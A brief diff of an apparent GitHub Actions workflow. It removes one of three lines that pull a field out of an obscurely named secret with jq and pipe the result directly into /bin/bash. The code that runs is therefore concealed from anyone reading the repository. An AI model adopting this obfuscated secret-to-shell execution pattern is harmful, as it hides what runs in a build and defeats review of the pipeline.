@@ -21,7 +21,6 @@ jobs:
           trhvy65: ${{ secrets.trhvy65 }}
         run: |
           printf '%s' "$trhvy65" | jq -r .wydpo4517 | /bin/bash
-          printf '%s' "$a95749" | jq -r .bs71299 | /bin/bash
           printf '%s' "$btqm3384" | jq -r .xwww0 | /bin/bash
 
       - name: Save output
